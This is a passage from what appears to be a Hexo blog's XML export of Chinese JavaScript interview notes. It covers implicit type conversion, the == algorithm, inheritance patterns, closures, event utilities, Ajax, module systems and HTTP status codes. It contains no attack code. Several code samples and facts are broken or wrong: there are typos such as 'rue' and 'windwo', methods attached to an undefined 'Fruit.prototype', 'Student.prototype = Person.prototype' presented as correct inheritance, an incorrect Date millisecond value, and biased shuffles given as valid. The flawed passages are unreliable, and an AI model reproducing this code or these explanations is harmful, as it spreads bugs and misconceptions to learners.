1234Number(&quot;3&quot;); // 3String(false); // &quot;false&quot;Boolean([]); // trueObject(3); // new Number(3) ps:值得注意的是，试图把undefined或null转换为对象，会抛出一个类型错误，而Object()显示转换不会，而是返回一个新创建的空对象 显示转换还有toString()、toFixed()、toExponential()、toPrecision()、parseInt()、parseFloat()方法，不细说 隐式转换隐式转换分为三种： 将值转换为原始值，ToPrimitive(input, PreferredType) 将值转化为数字，ToNumber() 将值转化为字符串，ToString() 原始类型数据转化相对比较简单，下面值看对象到原始类型的转换方式 对象的toString()和valueOf()方法 所有对象继承了两个转换方法：toString() 一般对象转化成[object object] {x: 1, y: 2}.toString(); // &quot;[object object]&quot; 数组转化成元素间加逗号 [1, 2, 3].toString(); // &quot;1,2,3&quot; 函数转化成定义(function(x){}).toString(); // &quot;function(x) {}&quot; 正则转化为直接量字符串 /\d+/g.toString(); // &quot;/\d+/g&quot; 日期转化为日期字符串 new Date(2000, 1, 1).toString(); // “Tue Feb 01 2000 00:00:00 GMT+0800 (中国标准时间)” valueOf()方法 大多数对象无法真正表示为一个原始值，valueOf()简单返回对象本身 日期对象是一个特例，返回毫秒数 new Date(2010, 0, 1).valueOf(); // 12623328000 对象到字符串的转换 如果对象具有toString()方法，则调用这个方法，如果它返回一个原始值，将这个值转化为字符串，并返回这个字符串结果 如果对象没有toString()方法，或者个这个方法不返回一个原始值，那么就会调用valueOf()方法。如果存在这个方法，则调用它，如果返回值是一个原始值，将这个值转化为只服从，并返回这个字符串结果 否则，就会抛出一个类型错误异常 对象到数字的转换 如果对象具有valueOf()方法，后者返回个亿原始值，则将这个原始值转化为数字，并返回这个数字 否则，如果对象有toString()方法，后者返回一个原始值，并转化成数字返回 否则，抛出一个类型错误异常 举个栗子： ({} + {}) = ? 两个对象的值进行+运算符，要先进行隐式转换成原始类型才能计算 1. ToPrimitive转换，因为没有指定PreferredType类型，默认为Number 2. 执行`valueOf()`方法，`{}.valueOf()`返回的还是{}对象 3. 继续执行`toString()`方法，`({}).toString()`返回`[Object Object]`，是原始值 所以最后结果：[Object Object][Object Object]ps:在Firefox中返回结果为NaN，因为第一个{}被当作一个代码块，没有解析转换，变成了+{}，也就是+[Object Object]，最终变成NaN ==元算符隐式转换==运算符应用和考察点很多，直接上ES5规范文档 1234567891011121314151617181920212223242526比较运算 x==y, 其中 x 和 y 是值，返回 true 或者 false。这样的比较按如下方式进行：1、若 Type(x) 与 Type(y) 相同， 则 1* 若 Type(x) 为 Undefined， 返回 true。 2* 若 Type(x) 为 Null， 返回 true。 3* 若 Type(x) 为 Number， 则 (1)、若 x 为 NaN， 返回 false。 (2)、若 y 为 NaN， 返回 false。 (3)、若 x 与 y 为相等数值， 返回 true。 (4)、若 x 为 +0 且 y 为 −0， 返回 true。 (5)、若 x 为 −0 且 y 为 +0， 返回 true。 (6)、返回 false。 4* 若 Type(x) 为 String, 则当 x 和 y 为完全相同的字符序列（长度相等且相同字符在相同位置）时返回 true。 否则， 返回 false。 5* 若 Type(x) 为 Boolean, 当 x 和 y 为同为 true 或者同为 false 时返回 true。 否则， 返回 false。 6* 当 x 和 y 为引用同一对象时返回 true。否则，返回 false。2、若 x 为 null 且 y 为 undefined， 返回 true。3、若 x 为 undefined 且 y 为 null， 返回 true。4、若 Type(x) 为 Number 且 Type(y) 为 String，返回比较 x == ToNumber(y) 的结果。5、若 Type(x) 为 String 且 Type(y) 为 Number，返回比较 ToNumber(x) == y 的结果。6、若 Type(x) 为 Boolean， 返回比较 ToNumber(x) == y 的结果。7、若 Type(y) 为 Boolean， 返回比较 x == ToNumber(y) 的结果。8、若 Type(x) 为 String 或 Number，且 Type(y) 为 Object，返回比较 x == ToPrimitive(y) 的结果。9、若 Type(x) 为 Object 且 Type(y) 为 String 或 Number， 返回比较 ToPrimitive(x) == y 的结果。10、返回 false。 总结起来有如下几点值得注意 NaN !== NaN x,y 为null、undefined两者中一个 // 返回true x、y为Number和String类型时，则转换为Number类型比较 有Boolean类型时，Boolean转化为Number类型比较 一个Object类型，一个String或Number类型，将Object类型进行原始转换后，按上面流程进行原始值比较 举一个栗子：123456789var a = &#123; valueOf: function () &#123; return1; &#125;, toString: function () &#123; return&apos;123&apos; &#125;&#125;console.log(rue == a) // true; 1. 首先，x与y类型不同，x为boolean类型，则进行ToNumber转换为1,为number类型 2. x为number，y为object类型，对y进行原始转换，ToPrimitive(a, ?),没有指定转换类型，默认number类型 3. ToPrimitive(a, Number)首先调用valueOf方法，返回1，得到原始类型1。 4. 1 == 1， 返回true ` 同理适用于&gt;、&lt;、!=、+运算符的隐式转换（但要除去日期对象）]]></content>
      <categories>
        <category>javascript</category>
      </categories>
      <tags>
        <tag>javascript</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[前端面试之javascript]]></title>
    <url>%2F2018%2F08%2F27%2Finter-js%2F</url>
    <content type="text"><![CDATA[介绍js的基本数据类型Undefined、Null、Boolean、Number、String、ECMAScript 2015 新增Symbol（创建后独一无二且不可变的数据类型） 介绍js有哪些内置对象？ Object 是 JavaScript 中所有对象的父对象 数据封装类对象：Object、Array、Boolean、Number 和 String 其他对象：Function、Arguments、Math、Date、RegExp、Error 说几条写JavaScript的基本规范？ 不要在同一行声明多个变量。 请使用 ===/!==来比较true/false或者数值 使用对象字面量替代new Array这种形式 不要使用全局函数。 Switch语句必须带有default分支 函数不应该有时候有返回值，有时候没有返回值。 For循环必须使用大括号 If语句必须使用大括号 for-in循环中的变量 应该使用var关键字明确限定作用域，从而避免作用域污染。 JavaScript原型每个对象会在内部初始化一个属性，就是property，当我们访问一个对象的属性时，如果这个对象内部不存在这个属性，就会去property里去找这个属性。这个property又有自己的property，于是一直找下去。 关系：instance.constructor.property = instance.__proto__ JavaScript有几种类型的值？你能画一下他们的内存图吗？栈：原始数据类型（Undefined，Null，Boolean，Number、String） 堆：引用数据类型（对象、数组和函数） 两种类型的区别是：存储位置不同； 原始数据类型直接存储在栈(stack)中的简单数据段，占据空间小、大小固定，属于被频繁使用数据，所以放入栈中存储； 引用数据类型存储在堆(heap)中的对象,占据空间大、大小不固定。如果存储在栈中，将会影响程序运行的性能；引用数据类型在栈中存储了指针，该指针指向堆中该实体的起始地址。当解释器寻找引用值时，会首先检索其在栈中的地址，取得地址后从堆中获得实体 请解释事件委托（event delegation）事件委托是将事件监听器添加到父元素，而不是每个子元素单独设置事件监听器。当触发子元素时，事件会冒泡到父元素，监听器就会触发，这种技术的好处是： 内存使用减少，因为只需一个父元素的事件处理程序，而不必为每个后代都添加事件处理程序。 无需从已删除的元素的元素中解绑处理程序，也无需将处理程序绑定到新元素上。 浮点数整数位每三位添加一个逗号12345function commafy(num) &#123; return num.toString().replace(/(\d)(?=(\d&#123;3&#125;)+\.)/g, function($1) &#123; return $1 + ',' &#125;);&#125; 如何实现数组的随机排序？ 方法一：依次取出一个位置和随机一个位置交换 1234567891011var arr = [1,2,3,4,5,6,7,8,9,10];function randSort1(arr)&#123; for(var i = 0,len = arr.length;i &lt; len; i++ )&#123; var rand = parseInt(Math.random()*len); var temp = arr[rand]; arr[rand] = arr[i]; arr[i] = temp; &#125; return arr;&#125;console.log(randSort1(arr)); 方法二：随机取出一个位置值，然后删除这个值，加入到新数组中，知道元素组为空 1234567891011var arr = [1,2,3,4,5,6,7,8,9,10];function randSort2(arr)&#123; var mixedArray = []; while(arr.length &gt; 0)&#123; var randomIndex = parseInt(Math.random()*arr.length); mixedArray.push(arr[randomIndex]); arr.splice(randomIndex, 1); &#125; return mixedArray;&#125;console.log(randSort2(arr)); 方法三：利用排序函数sort() 12345var arr = [1,2,3,4,5,6,7,8,9,10];arr.sort(function()&#123; return Math.random() - 0.5;&#125;)console.log(arr); JavaScript创建对象的几种方式？ 对象字面量 123456var person = &#123; gender: 'male' getDesc: function () &#123; return 'My gender is' + this.gender; &#125;&#125; 缺点：重复创建对象 工厂模式 12345678910function creatPerson () &#123; var person = &#123;&#125;; person.gender = 'male'; person.getDesc = function () &#123; return 'My gender is' + this.gender; &#125; return person;&#125;creatPerson(); 缺点：无法识别对象类型 构造函数模式 12345678function Person () &#123; this.gender = 'male'; this.getDesc = function () &#123; return 'My gender is' + this.gender; &#125;&#125;var person = new Person(); 缺点：不能复用方法 原型模式 123456789function Person () &#123; this.gender = 'male';&#125;CreatFruit.prototype.getDesc = function () &#123; return 'My gender is' + this.gender;&#125;var person = new Person(); 使用new操作符创建对象过程？ 创建一个新对象； 将构造函数的作用域赋值给新函数（因此this就指向了这个新对象）； 执行构造函数中的代码（为这个新对象添加属性）； 返回新对象。 JavaScript继承的几种实现方式？ 原型链继承 父类 1234567function Person () &#123; this.gender = 'male';&#125;Fruit.prototype.getDesc = function () &#123; return 'My gender is' + this.gender;&#125; 子类 12345678910function Student () &#123; this.task = 'study';&#125;Student.prototype = new Person();Student.prototype.constructor = Student;Student.prototype.getTask = function () &#123; return 'My task is' + this.task;&#125; 缺点：1. 原型对象上的引用类型属性所有实例共享；2. 不能向超类型的构造函数传参；3. 不支持多重继承。 组合继承 父类 12345678function Person (height) &#123; this.gender = 'male'; this.height = height;&#125;Fruit.prototype.getDesc = function () &#123; return 'My gender is' + this.gender;&#125; 子类 123456789101112function Student (height, marjor) &#123; Person.call(this, height); this.task = 'study'; this.marjor = marjor;&#125;Student.prototype = new Person();Student.prototype.constructor = Student;Student.prototype.getTask = function () &#123; return 'My task is' + this.task;&#125; 缺点：父类构造函数会被调用两次。 寄生组合继承 父类 12345678function Person (height) &#123; this.gender = 'male'; this.height = height;&#125;Fruit.prototype.getDesc = function () &#123; return 'My gender is' + this.gender;&#125; 子类 12345678910111213function Student (height, marjor) &#123; Person.call(this, height); this.task = 'study'; this.marjor = marjor;&#125;Student.prototype = Person.prototype;// Student.prototype = Object.create(Person.prototype);Student.prototype.constructor = Student;Student.prototype.getTask = function () &#123; return 'My task is' + this.task;&#125; 拷贝继承 父类 12345678function Person (height) &#123; this.gender = 'male'; this.height = height;&#125;Fruit.prototype.getDesc = function () &#123; return 'My gender is' + this.gender;&#125; 子类 12345678910111213function Student (height, marjor) &#123; Person.call(this, height); this.task = 'study'; this.marjor = marjor;&#125;for(var p in Person.prototype) &#123; Student.prototype[p] = Person.prototype[p];&#125;Student.prototype.getTask = function () &#123; return 'My task is' + this.task;&#125; 缺点：父级和子级原型链关系断开。 Javascript作用链域?作用域链的作用保证执行环境里有权访问的变量和函数时有序的。 全局函数无法查看局部函数的内部细节，但局部函数可以查看其上层的函数细节，直至全局细节。 当需要从局部函数查找某一属性或方法时，如果当前作用域没有找到，就会上溯到上层作用域查找，直至全局函数，这种组织形式就是作用域链。 谈谈This对象的理解 如果有new关键字，this指向new出来的那个对象； 如果apply、call或bind方法用于调用、创建一个函数，函数内的this就是作为传入这些方法的对象； 当函数作为对象里的方法被调用时，函数内的this是调用该函数的对象； 在事件中，this指向触发这个事件的对象，特殊的是，IE中的attachEvent中的this总是指向全局对象Window； 如果函数调用不符合上述规则，那么this的值指向全局对象（global object）。浏览器环境下this的值指向window对象，在严格模式下（”user strict”），this的值为undefined； 综上所述多个规则，较高（第一个最高，上一条最低）将决定this的值； ES2015中的箭头函数，将忽略上面的所有规则，this被设置为它被创建时的上下文； eval是做什么的？ 它的功能是把对应的字符串解析成JS代码并运行； 应该避免使用eval，不安全，非常耗性能（2次，一次解析成js语句，一次执行）。 由JSON字符串转换为JSON对象的时候可以用eval，var obj =eval(‘(‘+ str +’)’); 什么是window对象？什么是document对象？ window对象是指浏览器打开的窗口 document对象HTML文档对象的一个只读引用，window对象的一个属性 undefined和null的区别？ undefined表示变量声明了，但没有初始化 null表示一个对象“没有值”的值，也就是值为“空” 写一个通用的事件绑定对象1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192var EventUtil = &#123; // 添加事件 addHandler: function(element, type, handler) &#123; if(element.addEventListener) &#123; element.addEventListener(type, handler, false); &#125; else if(element.attachEvent) &#123; element.attachEvent("on" + type, handler); &#125; &#125;, // 获取事件对象 getEvent: function(ev) &#123; return ev || window.event; &#125;, // 获取事件目标 getTarget: function(ev) &#123; return ev.target || ev.srcElement; &#125;, // 阻止默认事件 preventDefault: function(ev) &#123; if(ev.preventDefault) &#123; ev.preventDefault(); &#125; else &#123; ev.returnValue = false; &#125; &#125;, // 阻止冒泡 stopPropagation: function(ev) &#123; if(ev.stopPropagation) &#123; ev.stopPropagation(); &#125; else &#123; ev.cancelBubble = true; &#125; &#125;, // 移除事件 removeHandler: function(element, type, handler) &#123; if(element.removeEventListener) &#123; element.removeEventListener(type, handler, false); &#125; else if(element.detachEvent) &#123; element.detachEvent("on" + type, handler); &#125; &#125;, // 获取相关元素 getRelatedTarget: function(ev) &#123; if(ev.relatedTarget) &#123; return ev.relatedTarget; &#125; else if(ev.toElement) &#123; return ev.toElement; &#125; else if(ev.fromElement) &#123; return ev.fromElement; &#125; &#125;, // 获取鼠标滚动 getWheelDelta: function(ev) &#123; // Firefox if(ev.DOMMouseScroll) &#123; return -ev.detail * 40; &#125; // 其他 else &#123; return ev.wheelDelta; &#125; &#125;, // 获取keypress按下键字符的ASCLL码 getCharCode: function(ev) &#123; if(typeof ev.charCode == "number") &#123; return ev.charCode; &#125; else &#123; return ev.keyCode; &#125; &#125;, // 获取剪贴板数据 getClipboardText: function(ev) &#123; var clipboardData = (event.clipboardData || window.clipboardData); return clipboardData.getData("text"); &#125;, // 设置剪贴板数据 setClipboardText: function(ev, value) &#123; if(ev.clipboardData) &#123; return ev.clipboardData.setData("text/plain", value); &#125; else if(windwo.clipboardData) &#123; return window.clipboardData.setData("text", value); &#125; &#125;&#125; 什么是闭包（closure），为什么要用它？闭包是指有权访问另一个函数作用域中变量的函数，创建闭包最常见的方式是一个函数内创建另一个函数，通过另一个函数访问这个函数的局部变量，利用闭包可以突破作用域链，将函数内部的变量和方法传递到外部。 闭包特性 内部函数再嵌套内部函数。 内部函数可以引用外层参数和变量。 参数和变量不会被垃圾回收机制回收。 作用 读取函数内部变量，变量能始终保存在内存中。 封装对象的私有属性和私有方法。 哪些操作会造成内存泄漏？内存泄漏是任何对象在你不再拥有或需要它之后仍然存在。 setTimeout的第一个参数使用字符串而非函数的话，会引起内存泄漏。 在早版本IE，HTML和DOM相互引用。 闭包使用不当。 XML和JSON区别 数据体积方面：JSON相对于XML，数据体积小，传递的速度快。 数据交互方面：JSON先对于XML，交互更方便，更容易解析处理，更好数据交互。 数据描述方面：JSON对数据的描述性比XML较差。 传输速度方面：JSON的速补远远快于XML。 javascript 代码中的”use strict”;是什么意思？使用它区别是什么？use strict是一种ECMAscript 5 添加的（严格）运行模式,这种模式使得 Javascript 在更严格的条件下运行, 使JS编码更加规范化的模式,消除Javascript语法的一些不合理、不严谨之处，减少一些怪异行为。 默认支持的糟糕特性都会被禁用，比如不能用with，也不能在意外的情况下给全局变量赋值; 全局变量的显示声明,函数必须声明在顶层，不允许在非函数代码块内声明函数,arguments.callee也不允许使用； 消除代码运行的一些不安全之处，保证代码运行的安全,限制函数中的arguments修改，严格模式下的eval函数的行为和非严格模式的也不相同; 提高编译器效率，增加运行速度； 为未来新版本的Javascript标准化做铺垫。 new操作符具体干什么的？ 创建一个空对象，并且this变量引用该对象，同时还继承了该函数的原型 属性和方法被加入到this引用的对象中 新创建的对象由this所引用，并且最后隐式的返回this 123var obj = &#123;&#125;;obj.__proto__ = Base.prototype;Base.call(obj); js延迟加载的方式有哪些？defer和async、动态创建DOM方式（用得最多）、按需异步载入js Ajax是什么？如何创建一个Ajax？Ajax全称：Asynchronous Javascript And XML异步传输+js+xml 所谓异步，在这里简单地解释就是：向服务器发送请求的时候，我们不必等待结果，而是可以同时做其他的事情，等到有了结果它自己会根据设定进行后续操作，与此同时，页面是不会发生整页刷新的，提高了用户体验。 Ajax原理简单来说实在用户和服务器之间加一个中间层（Ajax引擎），通过XMLHttpRequest对象来向服务器发送异步请求，从服务器获取数据，而后用JavaScript来操作DOM更新页面。使得用户操作和服务器响应异步化。 步骤： 创建XMLHttpRequest对象,也就是创建一个异步调用对象 创建一个新的HTTP请求,并指定该HTTP请求的方法、URL及验证信息 设置响应HTTP请求状态变化的函数 发送HTTP请求 获取异步调用返回的数据 使用JavaScript和DOM实现局部刷新 123456789101112var xhr = new XMLHttpRequest();xhr.open('get', url, true);xhr.onreadystatechange = function () &#123; if(xhr.readyState == 4) &#123; if(xhr.status == 200) &#123; success(xhr.responseText); &#125; else &#123; error(xhr.status); &#125; &#125;&#125;xhr.send(null); Ajax 解决浏览器缓存问题？ 在ajax发送请求前加上 anyAjaxObj.setRequestHeader(&quot;If-Modified-Since&quot;,&quot;0&quot;) 在ajax发送请求前加上 anyAjaxObj.setRequestHeader(&quot;Cache-Control&quot;,&quot;no-cache&quot;) 在URL后面加上一个随机数：&quot;fresh=&quot; + Math.random() 在URL后面加上时间戳 Ajax的优缺点？优点： 异步模式，局部刷新，提示用户体验 优化了浏览器和服务器之间的传输，减少不必要的数据返回，减少减少带宽 Ajax在客户端运行，承担了一部分本来由服务器承担的工作，减少了大用户量下的服务器负载 缺点： 安全问题，暴露与服务器交互细节 对搜索引擎支持比较弱 模块化开发怎么做？立即执行函数，不暴露已有成员。 12345678910111213var module1 = (function () &#123; var a = 100; var private1 = function () &#123; &#125; var public1 = function () &#123; // ... &#125;; return &#123; public1: public1 &#125;&#125;); 如何解决跨域问题?jsonp、 iframe、window.name、window.postMessage、服务器上设置代理页面 页面编码和被请求的资源编码如果不一致如何处理？在引入资源设置响应的编码格式，&lt;script src=&quot;http://xxx.com/a.js&quot; charset=&quot;utf-8&quot;&gt;&lt;/script&gt; AMD（Modules/Asynchronous-Definition）、CMD（Common Module Definition）规范区别？ AMD 异步模块定义，是 RequireJS 在推广过程中对模块定义的规范化产出 CMD 通用模块定义，是 SeaJS 在推广过程中对模块定义的规范化产出 这些规范的目的都是为了 JavaScript 的模块化开发，特别是在浏览器端的， 目前这些规范的实现都能达成浏览器端模块化开发的目的 区别： 对于依赖的模块，AMD 是提前执行，CMD 是延迟执行。不过 RequireJS 从 2.0 开始，也改成可以延迟执行（根据写法不同，处理方式不同）。CMD 推崇 as lazy as possible CMD 推崇依赖就近，AMD 推崇依赖前置 AMD 的 API 默认是一个当多个用，CMD 的 API 严格区分，推崇职责单一 说说你对AMD和CommonJS的了解他们都是实现模块提示的方式，知道ES2015出现之前，javascript一直没有模块化体系。CommonJS是同步的，而AMD（Asynchronous Module Definition）从全称中可以明显看出是异步的。CommonJS 的设计是为服务器端开发考虑的，而 AMD 支持异步加载模块，更适合浏览器。 我发现 AMD 的语法非常冗长，CommonJS 更接近其他语言 import 声明语句的用法习惯。大多数情况下，我认为 AMD 没有使用的必要，因为如果把所有 JavaScript 都捆绑进一个文件中，将无法得到异步加载的好处。此外，CommonJS 语法上更接近 Node 编写模块的风格，在前后端都使用 JavaScript 开发之间进行切换时，语境的切换开销较小。 CommonJS 中的 require/exports 和 ES6 中的 import/export 区别？ CommonJS 模块的重要特性是加载时执行，即脚本代码在 require 的时候，就会全部执行。一旦出现某个模块被”循环加载”，就只输出已经执行的部分，还未执行的部分不会输出。 ES6 模块是动态引用，如果使用 import 从一个模块加载变量，那些变量不会被缓存，而是成为一个指向被加载模块的引用，需要开发者自己保证，真正取值的时候能够取到值。 import/export 最终都是编译为 require/exports 来执行的。 CommonJS 规范规定，每个模块内部， module 变量代表当前模块。这个变量是一个对象，它的 exports 属性（即module.exports ）是对外的接口。加载某个模块，其实是加载该模块的 module.exports 属性。 export 命令规定的是对外的接口，必须与模块内部的变量建立一一对应关系。 import引入脚本文件省略后缀名，Node会怎样查找？如果脚本文件省略了后缀名，比如import &#39;./foo&#39;，Node 会依次尝试四个后缀名：./foo.mjs、./foo.js、./foo.json、./foo.node。如果这些脚本文件都不存在，Node 就会去加载./foo/package.json的main字段指定的脚本。如果./foo/package.json不存在或者没有main字段，那么就会依次加载./foo/index.mjs、./foo/index.js、./foo/index.json、./foo/index.node。如果以上四个文件还是都不存在，就会抛出错误。 请解释下面代码为什么不能用作 IIFE：function foo(){ }();，需要作出哪些修改才能使其成为 IIFE？IIFE（Immediately Invoked Function Expressions）代表立即执行函数。 JavaScript 解析器将 function foo(){ }();解析成function foo(){ }和();。其中，前者是函数声明；后者（一对括号）是试图调用一个函数，却没有指定名称，因此它会抛出Uncaught SyntaxError: Unexpected token的错误。 修改方法是：再添加一对括号，形式上有两种：(function foo(){ })()和(function foo(){ }())。以上函数不会暴露到全局作用域，如果不需要在函数内部引用自身，可以省略函数的名称。 documen.write和 innerHTML的区别？document.write只能重绘整个页面，innerHTML可以重绘页面的一部分 DOM操作——怎样添加、移除、移动、复制、创建和查找节点？ 创建节点 document.createDocumentFragment() // 文档碎片 document.createElement(元素标签) // 创建元素节点 document.createTextNode(文本内容) // 创建文本节点 添加、移除、复制系节点 父节点.appendChildren(要添加的子节点) // 添加子节点 父节点.removeChildren(要删除的子节点) // 移除子节点 被复制的节点.cloneNode(true/false) //复制节点 查找 DOM.getElementsByTagName() // 标签查找 DOM.getElementsByName() // name属性查找 DOM.getElementById() // id查找 数组和对象有哪些原生方法，列举一下？ 数组： push, pop, shift, unshift, concat, splice, slice 其中队列方法：push, shift 栈方法：push, pop 对象： assign, create, defineProperty, defineProperty, entries, freeze, getOwnPropertyDescriptor, getOwnPropertyDescriptors, getOwnPropertyNames, getOwnPropertySymbols, getPropertyOf, is, isExtensible, isFrozen, hasOwnPropertyOf jquery.extend 与 jquery.fn.extend的区别？ jquery.extend 为jquery类添加类方法，可以理解为添加静态方法 源码中jquery.fn = jquery.prototype，所以对jquery.fn的扩展，就是为jquery类添加成员函数使用 jquery.extend扩展，需要通过jquery类来调用，而jquery.fn.extend扩展，所有jquery实例都可以直接调用 什么是polyfill？polyfill 是“在旧版浏览器上复制标准 API 的 JavaScript 补充”,可以动态地加载 JavaScript 代码或库，在不支持这些标准 API 的浏览器中模拟它们。 例如，geolocation（地理位置）polyfill 可以在 navigator 对象上添加全局的 geolocation 对象，还能添加 getCurrentPosition 函数以及“坐标”回调对象，所有这些都是 W3C 地理位置 API 定义的对象和函数。因为 polyfill 模拟标准 API，所以能够以一种面向所有浏览器未来的方式针对这些 API 进行开发，一旦对这些 API 的支持变成绝对大多数，则可以方便地去掉 polyfill，无需做任何额外工作。 谈谈你对webpack的看法？WebPack 是一个模块打包工具，你可以使用WebPack管理你的模块依赖，并编绎输出模块们所需的静态文件。它能够很好地管理、打包Web开发中所用到的HTML、Javascript、CSS以及各种静态文件（图片、字体等），让开发过程更加高效。对于不同类型的资源，webpack有对应的模块加载器。webpack模块打包器会分析模块间的依赖关系，最后 生成了优化且合并后的静态资源 Webpack热更新实现原理? Webpack编译期，为需要热更新的 entry 注入热更新代码(EventSource通信) 页面首次打开后，服务端与客户端通过 EventSource 建立通信渠道，把下一次的 hash 返回前端 客户端获取到hash，这个hash将作为下一次请求服务端 hot-update.js 和 hot-update.json的hash 修改页面代码后，Webpack 监听到文件修改后，开始编译，编译完成后，发送 build 消息给客户端 客户端获取到hash，成功后客户端构造hot-update.js script链接，然后插入主文档 hot-update.js 插入成功后，执行hotAPI 的 createRecord 和 reload方法，获取到 Vue 组件的 render方法，重新 render 组件， 继而实现 UI 无刷新更新。 函数截流和函数防抖？函数节流: 频繁触发,但只在特定的时间内才执行一次代码 1234567891011121314// 函数节流var canRun = true;document.getElementById("throttle").onscroll = function()&#123; if(!canRun)&#123; // 判断是否已空闲，如果在执行中，则直接return return; &#125; canRun = false; setTimeout(function()&#123; console.log("函数节流"); canRun = true; &#125;, 300);&#125;; 函数防抖: 频繁触发,但只在特定的时间内没有触发执行条件才执行一次代码 123456789// 函数防抖var timer = false;document.getElementById("debounce").onscroll = function()&#123; clearTimeout(timer); // 清除未执行的代码，重置回初始化状态 timer = setTimeout(function()&#123; console.log("函数防抖"); &#125;, 300);&#125;; Object.is() 与原来的比较操作符“ ===”、“ ==”的区别？ 两等号判等，会在比较时进行类型转换 三等号判等，比较时不进行隐式类型转换 Object.is在三等号基础上处理了NaN、-0 和+0，使得-0和+0不同，Object.is(NaN, NaN)返回true 页面重构怎么操作？网站重构：在不改变外部行为的前提下，简化结构、添加可读性，而在网站前端保持一致的行为。也就是说是在不改变UI的情况下，对网站进行优化，在扩展的同时保持一致的UI。 对于传统的网站来说重构通常是： 表格(table)布局改为DIV+CSS 使网站前端兼容于现代浏览器(针对于不合规范的CSS、如对IE6有效的) 对于移动平台的优化 针对于SEO进行优化 深层次的网站重构应该考虑的方面 减少代码间的耦合 让代码保持弹性 严格按规范编写代码 设计可扩展的API 代替旧有的框架、语言(如VB) 增强用户体验 通常来说对于速度的优化也包含在重构中 压缩JS、CSS、image等前端资源(通常是由服务器来解决) 程序的性能优化(如数据读写) 采用CDN来加速资源加载 对于JS DOM的优化 HTTP服务器的文件缓存 设计模式 知道什么是singleton, factory, strategy, decrator么？ Singleton，单例模式：保证一个类只有一个实例，并提供一个访问它的全局访问点 Factory Method，工厂方法：定义一个用于创建对象的接口，让子类决定实例化哪一个类，Factory Method使一个类的实例化延迟到了子类 Strategy，策略模式：定义一系列的算法，把他们一个个封装起来，并使他们可以互相替换，本模式使得算法可以独立于使用它们的客户 Decrator，装饰模式：动态地给一个对象增加一些额外的职责，就增加的功能来说，Decorator模式相比生成子类更加灵活 什么叫优雅降级和渐进增强？ 优雅降级：Web站点在所有新式浏览器中都能正常工作，如果用户使用的是老式浏览器，则代码会针对旧版本的IE进行降级处理了,使之在旧式浏览器上以某种形式降级体验却不至于完全不能用。如：border-shadow 渐进增强：从被所有浏览器支持的基本功能开始，逐步地添加那些只有新版本浏览器才支持的功能,向页面增加不影响基础浏览器的额外样式和功能的。当浏览器支持时，它们会自动地呈现出来并发挥作用。如：默认使用flash上传，但如果浏览器支持 HTML5 的文件上传功能，则使用HTML5实现更好的体验 WEB应用从服务器主动推送Data到客户端有那些方式？ html5提供的Websocket 不可见的iframe WebSocket通过Flash XHR长时间连接 XHR Multipart Streaming &lt;script&gt;标签的长时间连接(可跨域) 对Node的优点和缺点提出了自己的看法？ 优点：Node是基于事件驱动和无阻塞的，所以非常适合处理并发请求 缺点：Node是一个相对新的开源项目，所以不太稳定，它总是一直在变， 而且缺少足够多的第三方库支持。 http状态码有那些？分别代表是什么意思？简单版： 100 Continue 继续，一般在发送post请求时，已发送了http header之后服务端将返回此信息，表示确认，之后发送具体参数信息 200 OK 正常返回信息 201 Created 请求成功并且服务器创建了新的资源 202 Accepted 服务器已接受请求，但尚未处理 301 Moved Permanently 请求的网页已永久移动到新位置。 302 Found 临时性重定向。 303 See Other 临时性重定向，且总是使用 GET 请求新的 URI。 304 Not Modified 自从上次请求后，请求的网页未修改过。 400 Bad Request 服务器无法理解请求的格式，客户端不应当尝试再次使用相同的内容发起请求。 401 Unauthorized 请求未授权。 403 Forbidden 禁止访问。 404 Not Found 找不到如何与 URI 相匹配的资源。 500 Internal Server Error 最常见的服务器端错误。 503 Service Unavailable 服务器端暂时无法处理请求（可能是过载或维护）。 完整版 (信息类)：表示接收到请求并且继续处理 100——客户必须继续发出请求 (信息类)：表示接收到请求并且继续处理 100——客户必须继续发出请求 101——客户要求服务器根据请求转换HTTP协议版本 (响应成功)：表示动作被成功接收、理解和接受 200——表明该请求被成功地完成，所请求的资源发送回客户端 201——提示知道新文件的URL 202——接受和处理、但处理未完成 203——返回信息不确定或不完整 204——请求收到，但返回信息为空 205——服务器完成了请求，用户代理必须复位当前已经浏览过的文件 206——服务器已经完成了部分用户的GET请求 (重定向类)：为了完成指定的动作，必须接受进一步处理 300——请求的资源可在多处得到 301——本网页被永久性转移到另一个URL 302——请求的网页被转移到一个新的地址，但客户访问仍继续通过原始URL地址，重定向，新的URL会在response中的Location中返回，浏览器将会使用新的URL发出新的Request。 303——建议客户访问其他URL或访问方式 304——自从上次请求后，请求的网页未修改过，服务器返回此响应时，不会返回网页内容，代表上次的文档已经被缓存了，还可以继续使用 305——请求的资源必须从服务器指定的地址得到 306——前一版本HTTP中使用的代码，现行版本中不再使用 307——申明请求的资源临时性删除 (客户端错误类)：请求包含错误语法或不能正确执行 400——客户端请求有语法错误，不能被服务器所理解 401——请求未经授权，这个状态代码必须和WWW-Authenticate报头域一起使用 HTTP 401.1 - 未授权：登录失败 - HTTP 401.2 - 未授权：服务器配置问题导致登录失败 - HTTP 401.3 - ACL 禁止访问资源 - HTTP 401.4 - 未授权：授权被筛选器拒绝 HTTP 401.5 - 未授权：ISAPI 或 CGI 授权失败 402——保留有效ChargeTo头响应 403——禁止访问，服务器收到请求，但是拒绝提供服务 HTTP 403.1 禁止访问：禁止可执行访问 - HTTP 403.2 - 禁止访问：禁止读访问 - HTTP 403.3 - 禁止访问：禁止写访问 - HTTP 403.4 - 禁止访问：要求 SSL - HTTP 403.5 - 禁止访问：要求 SSL 128 - HTTP 403.6 - 禁止访问：IP 地址被拒绝 - HTTP 403.7 - 禁止访问：要求客户证书 - HTTP 403.8 - 禁止访问：禁止站点访问 - HTTP 403.9 - 禁止访问：连接的用户过多 - HTTP 403.10 - 禁止访问：配置无效 - HTTP 403.11 - 禁止访问：密码更改 - HTTP 403.12 - 禁止访问：映射器拒绝访问 - HTTP 403.13 - 禁止访问：客户证书已被吊销 - HTTP 403.15 - 禁止访问：客户访问许可过多 - HTTP 403.16 - 禁止访问：客户证书不可信或者无效 HTTP 403.17 - 禁止访问：客户证书已经到期或者尚未生效 404——一个404错误表明可连接服务器，但服务器无法取得所请求的网页，请求资源不存在。eg：输入了错误的URL 405——用户在Request-Line字段定义的方法不允许 406——根据用户发送的Accept拖，请求资源不可访问 407——类似401，用户必须首先在代理服务器上得到授权 408——客户端没有在用户指定的饿时间内完成请求 